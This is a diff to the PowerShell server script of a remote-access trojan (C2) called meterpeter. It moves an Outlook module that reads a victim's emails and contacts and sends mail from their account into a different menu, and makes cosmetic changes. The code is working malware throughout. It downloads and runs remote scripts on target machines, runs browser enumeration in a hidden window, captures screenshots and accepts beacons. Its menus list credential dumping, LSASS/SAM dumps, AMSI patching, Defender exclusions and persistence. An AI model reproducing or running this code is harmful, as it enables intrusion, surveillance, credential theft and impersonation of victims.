@@ -552,7 +552,7 @@ If($check -ieq $False)
 
     }
 
-    write-Host "[i] Send the URL generated to target to trigger download.." -ForegroundColor DarkGray;
+    write-Host "[i] Send the URL generated to target to trigger download.." -ForegroundColor DarkYellow;
     Copy-Item -Path "${IPATH}\Mimiratz\theme\Catalog.png" -Destination "${APACHE}Catalog.png"|Out-Null
     Copy-Item -Path "${IPATH}\Mimiratz\theme\favicon.png" -Destination "${APACHE}favicon.png"|Out-Null
     Copy-Item -Path "${IPATH}\Mimiratz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
@@ -744,7 +744,8 @@ ${/$.}=+$(  )  ;  ${).!}  =${/$.}  ;${#~}  =  ++  ${/$.}  ;  ${[/}  =(  ${/$.}  
 $Socket.Start();
 $Client = $Socket.AcceptTcpClient();
 $Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString
-Write-Host "[-] Beacon received: $Remote_Host" -ForegroundColor Green
+Write-Host "[-] Beacon received: " -ForegroundColor Green -NoNewline
+Write-Host "$Remote_Host" -ForegroundColor Red
 
 
 ## Connection Banner
@@ -1534,14 +1535,137 @@ While($Client.Connected)
       write-host "   ListRun     List remote host startup run entrys";
       write-host "   AntiVirus   Enumerate all EDR Products installed";
       write-host "   FRManager   Manage remote 'active' firewall rules";
+      write-host "   OutLook     Manage OutLook Exchange Email Objects";
       write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Adv> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
       ## Runing sellected Module(s).
+      If($choise -ieq "OutLook")
+      {
+         write-host "`n`n   Description:" -ForegroundColor Yellow;
+         write-host "   Module to enumerate OutLook Exchange Emails, Read is contents";
+         write-host "   on terminal console or dump found Email Objects to a logfile.";
+         write-host "   If invoked -SemdMail then target address will be used as Sender." -ForegroundColor Yellow;
+         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
+         write-host "   -------   -----------                     ------------------";
+         write-host "   Folders   Display outlook folder names    UserLand";
+         write-host "   Contacts  Display outlook contacts info   UserLand";
+         write-host "   Emails    Display outlook email objects   UserLand";
+         write-host "   SendMail  Send Email using target domain  UserLand";
+         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+         write-host "`n`n :meterpeter:Adv:OutLook> " -NoNewline -ForeGroundColor Green;
+         $OutLook_choise = Read-Host;
+         If($OutLook_choise -ieq "Folders")
+         {
+            #Execute command remotely
+            Write-Host " * Scanning OutLook for folder names!" -ForegroundColor Green
+            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'folders' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}";
+         }
+         If($OutLook_choise -ieq "Contacts")
+         {
+            Write-Host " - Max outlook items to display: " -NoNewline;
+            $MaxOfObjectsToDisplay = Read-Host;
+            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
+            {
+               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
+            }
+
+            Write-Host " - Create report logfile? (y|n): " -NoNewline;
+            $CreateLogFileSetting = Read-Host;
+            If($CreateLogFileSetting -iMatch '^(y|yes)$')
+            {
+               $CreateLogFileSetting = "True"
+            }
+            Else
+            {
+               $CreateLogFileSetting = "False"            
+            }
+
+            #Execute command remotely
+            Write-Host " * Scanning OutLook for Contact Objects" -ForegroundColor Green
+            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -maxitems '$MaxOfObjectsToDisplay' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
+         }
+         If($OutLook_choise -ieq "Emails")
+         {
+            Write-Host " - Max outlook items to display: " -NoNewline;
+            $MaxOfObjectsToDisplay = Read-Host;
+            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
+            {
+               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
+            }
+
+            Write-Host " - Display message <BODY> (y|n): " -NoNewline;
+            $UseVerbose = Read-Host;
+            If($UseVerbose -iMatch '^(y|yes)$')
+            {
+               $UseVerbose = "True"
+            }
+            Else
+            {
+               $UseVerbose = "False"            
+            }
+
+            Write-Host " - Create report logfile? (y|n): " -NoNewline;
+            $CreateLogFileSetting = Read-Host;
+            If($CreateLogFileSetting -iMatch '^(y|yes)$')
+            {
+               $CreateLogFileSetting = "True"
+            }
+            Else
+            {
+               $CreateLogFileSetting = "False"            
+            }
+
+            #Execute command remotely
+            Write-Host " * Scanning OutLook for Email Objects" -ForegroundColor Green
+            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
+         }
+         If($OutLook_choise -ieq "SendMail")
+         {
+            #<SendTo>, <SendSubject>, <SendBody>
+            Write-Host " - Send To Email: " -ForegroundColor Red -NoNewline;
+            $SendTo = Read-Host;
+            If(-not($SendTo) -or $SendTo -ieq $null)
+            {
+               write-host "`n"
+               write-host "   [Error] Module requires 'SendTo' address!" -ForegroundColor Red -BackgroundColor Black
+               write-host "   [ inf ] SendTo: 'pedroUbuntui@gmail.com'" -ForegroundColor DarkGray
+               $OutLook_choise = $null
+               $Command = $null
+            }
+            Else
+            {
+               Write-Host " - Email Subject: " -NoNewline;
+               $SendSubject = Read-Host;
+               If(-not($SendSubject) -or $SendSubject -ieq $null)
+               {
+                  $SendSubject = "@Meterpeter C2 v2.10.11 Email"
+               }
+
+               Write-Host " - Email Body   : " -NoNewline;
+               $SendBody = Read-Host;
+               If(-not($SendBody) -or $SendBody -ieq $null)
+               {
+                  $SendBody = "Testing @Meterpeter C2 SendEmail funtion ..."
+               }
+
+               #Execute command remotely
+               Write-Host " * Send Email using '" -ForegroundColor Green -NoNewline
+               Write-Host "$Remote_Host" -ForegroundColor DarkYellow -NoNewline
+               Write-Host "' OutLook!" -ForegroundColor Green
+               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Unblock-File;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'send' -SendTo '$SendTo' -SendSubject '$SendSubject' -SendBody '$SendBody' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
+            }
+         }
+         If($OutLook_choise -ieq "Return" -or $OutLook_choise -ieq "cls" -or $OutLook_choise -ieq "Modules")
+         {
+            $OutLook_choise = $null
+            $Command = $Null;
+         }
+      }
       If($choise -ieq "Accounts" -or $choise -ieq "acc")
       {
-         write-host " * Listing remote host accounts." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
-         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Name,Caption,PasswordRequired,PasswordChangeable|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -Skip 1|Select -SkipLast 2;If(-not(`$Out)){echo `"   [x] Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
+         write-host " * Listing remote accounts." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
+         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Name,SID,PasswordRequired,PasswordChangeable|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -Skip 1|Select -SkipLast 2;If(-not(`$Out)){echo `"   [x] Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
       }
       If($choise -ieq "RevShell" -or $choise -ieq "Shell")
       {
@@ -1590,10 +1714,10 @@ While($Client.Connected)
          If($wifi_choise -ieq "Check")
          {
             write-host " * List remote processe(s) running." -ForegroundColor Green
-            write-host "   => exclude: SrTasks|wlanext|svchost|RuntimeBroker`n" -ForegroundColor Yellow
+            write-host "   => Exclude: wlanext|svchost|RuntimeBroker`n" -ForegroundColor Yellow
             
             Start-Sleep -Seconds 1
-            $Command = "Get-Process|Select-Object Id,ProcessName,Description,ProductVersion|Where-Object{`$_.ProcessName -iNotMatch '(wlanext`|svchost`|RuntimeBroker`|SrTasks)'}|Format-Table -AutoSize|Out-File dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not(`$check_tasks)){echo `"   cmdlet failed to retrieve processes List ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}Else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+            $Command = "Get-Process|Select-Object Id,ProcessName,Description,ProductVersion|Where-Object{`$_.ProcessName -iNotMatch '(wlanext`|svchost`|RuntimeBroker)'}|Format-Table -AutoSize|Out-File dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not(`$check_tasks)){echo `"   cmdlet failed to retrieve processes List ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}Else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
          }
          If($wifi_choise -ieq "kill")
          {
@@ -1798,12 +1922,14 @@ While($Client.Connected)
          $Enumerate_choise = Read-Host;
          If($Enumerate_choise -ieq "Start")
          {
-           write-host " * List $Remote_Host install browsers" -ForegroundColor Green
+           write-host " * List " -ForegroundColor Green -NoNewline
+           write-host "$Remote_Host" -ForegroundColor DarkYellow -NoNewline
+           write-host " install browsers" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -RECON;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
          }
          If($Enumerate_choise -ieq "addons")
          {
-           write-host " * Installed browsers addons query." -ForegroundColor Green
+           write-host " * List installed browsers addons." -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -ADDONS;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
          }
          If($Enumerate_choise -ieq "Verbose")
@@ -1872,7 +1998,7 @@ While($Client.Connected)
          $my_choise = Read-Host;
          If($my_choise -ieq "Primary")
          {
-            write-host " * Listing Primary AV Product (Fast)" -ForegroundColor Green;Start-Sleep -Seconds 1
+            write-host " * Listing Primary AV Product" -ForegroundColor Green;Start-Sleep -Seconds 1
             $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1`" -outfile `"`$Env:TMP\GetCounterMeasures.ps1`"|Unblock-File;powershell -File `$Env:TMP\GetCounterMeasures.ps1 -Action Enum;Remove-Item -Path `$Env:TMP\GetCounterMeasures.ps1 -Force";
          }
          If($my_choise -ieq "FastScan")
@@ -2258,17 +2384,16 @@ While($Client.Connected)
       write-host "   Camera      Take snapshots with remote webcam";
       write-host "   FindEop     Search for EOP possible entry points";
       write-host "   Escalate    Escalate privs from UserLand to Admin";
-      write-host "   Persist     Persist the rev tcp shell on startup";
+      write-host "   Persist     Persist reverse tcp shell on startup";
       write-host "   TimeStamp   Change remote host files timestamp";
       write-host "   Artifacts   Clean remote host activity tracks";
       write-host "   HiddenDir   Super\hidden directorys manager";
       write-host "   hideUser    Remote hidden accounts manager";
-      write-host "   Passwords   Search for credentials inside files";
+      write-host "   Passwords   Dump credentials (vault|dpapi|files)";
       write-host "   BruteAcc    Brute-force user account password";
       write-host "   PhishCred   Promp remote user for logon creds";
-      write-host "   OutLook     Manage OutLook Exchange Email Objects";
       write-host "   AMSIpatch   Disable AMS1 within current process";
-      write-host "   Allprivs    Enable all shell privs to exec cmdline";
+      write-host "   Allprivs    Enable all current shell privileges";
       write-host "   DumpSAM     DumpLSASS/SAM/SYSTEM/SECURITY metadata";
       write-host "   Exclusions  Manage Windows Defender exclusions";
       write-host "   LockPC      Lock remote host WorkStation";
@@ -2276,128 +2401,6 @@ While($Client.Connected)
       write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
-      If($choise -ieq "OutLook")
-      {
-         write-host "`n`n   Description:" -ForegroundColor Yellow;
-         write-host "   Module to enumerate OutLook Exchange Emails, Read is contents";
-         write-host "   on terminal console or dump found Email Objects to a logfile.";
-         write-host "   If invoked -SemdMail then target address will be used as Sender." -ForegroundColor Yellow;
-         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
-         write-host "   -------   -----------                     ------------------";
-         write-host "   Folders   Display outlook folder names    UserLand";
-         write-host "   Contacts  Display outlook contacts info   UserLand";
-         write-host "   Emails    Display outlook email objects   UserLand";
-         write-host "   SendMail  Send Email using target domain  UserLand";
-         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n :meterpeter:Post:OutLook> " -NoNewline -ForeGroundColor Green;
-         $OutLook_choise = Read-Host;
-         If($OutLook_choise -ieq "Folders")
-         {
-            #Execute command remotely
-            Write-Host " * Scanning OutLook for folder names!" -ForegroundColor Green
-            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'folders' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}";
-         }
-         If($OutLook_choise -ieq "Contacts")
-         {
-            Write-Host " - Max outlook items to display: " -NoNewline;
-            $MaxOfObjectsToDisplay = Read-Host;
-            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
-            {
-               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
-            }
-
-            Write-Host " - Create report logfile? (y|n): " -NoNewline;
-            $CreateLogFileSetting = Read-Host;
-            If($CreateLogFileSetting -iMatch '^(y|yes)$')
-            {
-               $CreateLogFileSetting = "True"
-            }
-            Else
-            {
-               $CreateLogFileSetting = "False"            
-            }
-
-            #Execute command remotely
-            Write-Host " * Scanning OutLook for Contact Objects" -ForegroundColor Green
-            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -maxitems '$MaxOfObjectsToDisplay' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
-         }
-         If($OutLook_choise -ieq "Emails")
-         {
-            Write-Host " - Max outlook items to display: " -NoNewline;
-            $MaxOfObjectsToDisplay = Read-Host;
-            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
-            {
-               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
-            }
-
-            Write-Host " - Display message <BODY> (y|n): " -NoNewline;
-            $UseVerbose = Read-Host;
-            If($UseVerbose -iMatch '^(y|yes)$')
-            {
-               $UseVerbose = "True"
-            }
-            Else
-            {
-               $UseVerbose = "False"            
-            }
-
-            Write-Host " - Create report logfile? (y|n): " -NoNewline;
-            $CreateLogFileSetting = Read-Host;
-            If($CreateLogFileSetting -iMatch '^(y|yes)$')
-            {
-               $CreateLogFileSetting = "True"
-            }
-            Else
-            {
-               $CreateLogFileSetting = "False"            
-            }
-
-            #Execute command remotely
-            Write-Host " * Scanning OutLook for Email Objects" -ForegroundColor Green
-            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
-         }
-         If($OutLook_choise -ieq "SendMail")
-         {
-            #<SendTo>, <SendSubject>, <SendBody>
-            Write-Host " - Send To Email: " -ForegroundColor Red -NoNewline;
-            $SendTo = Read-Host;
-            If(-not($SendTo) -or $SendTo -ieq $null)
-            {
-               write-host "`n"
-               write-host "   [Error] Module requires 'SendTo' address!" -ForegroundColor Red -BackgroundColor Black
-               write-host "   [ inf ] SendTo: 'pedroUbuntui@gmail.com'" -ForegroundColor DarkGray
-               $OutLook_choise = $null
-               $Command = $null
-            }
-            Else
-            {
-               Write-Host " - Email Subject: " -NoNewline;
-               $SendSubject = Read-Host;
-               If(-not($SendSubject) -or $SendSubject -ieq $null)
-               {
-                  $SendSubject = "@Meterpeter C2 v2.10.11 Email"
-               }
-
-               Write-Host " - Email Body   : " -NoNewline;
-               $SendBody = Read-Host;
-               If(-not($SendBody) -or $SendBody -ieq $null)
-               {
-                  $SendBody = "Testing @Meterpeter C2 SendEmail funtion ..."
-               }
-
-               #Execute command remotely
-               Write-Host " * Send Email using '" -ForegroundColor Green -NoNewline
-               Write-Host "$Remote_Host" -ForegroundColor DarkYellow -NoNewline
-               Write-Host "' OutLook!" -ForegroundColor Green
-               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Unblock-File;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'send' -SendTo '$SendTo' -SendSubject '$SendSubject' -SendBody '$SendBody' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
-            }
-         }
-         If($OutLook_choise -ieq "Return" -or $OutLook_choise -ieq "cls" -or $OutLook_choise -ieq "Modules")
-         {
-            $OutLook_choise = $null
-            $Command = $Null;
-         }
-      } 
       If($choise -ieq "HiddenDir" -or $choise -ieq "Hidden")
       {
          write-host "`n`n   Description:" -ForegroundColor Yellow
@@ -3911,8 +3914,7 @@ While($Client.Connected)
            Write-Host " * Screenshot File:'" -ForegroundColor Green -NoNewline
            Write-Host "$File.png" -ForegroundColor DarkGray -NoNewline
            Write-Host "'" -ForegroundColor Green
-           write-host "   => " -ForegroundColor DarkYellow -NoNewline
-           write-host "Remark: wait for module to finish.." -ForegroundColor DarkGray
+           write-host "   => Remark: wait for module to finish.." -ForegroundColor Red
            
            $Command = "`$FilePath=`"`$Env:TMP\#`";Add-Type $Obf System.Windows.Forms;`$Microsof=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);`$Catrapilar=[System.Drawing.Graphics]::FromImage(`$Microsof);`$Catrapilar.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),`$Microsof.Size);`$Catrapilar.Dispose();Start-Sleep -Milliseconds 200;`$Microsof.Save(`"`$FilePath`");If(([System.IO.File]::Exists(`"`$FilePath`"))){[io.file]::ReadAllBytes(`"`$FilePath`") -join ',';Remove-Item -Path `"`$FilePath`" -Force}";
            $Command = $Command -replace "#","$File";
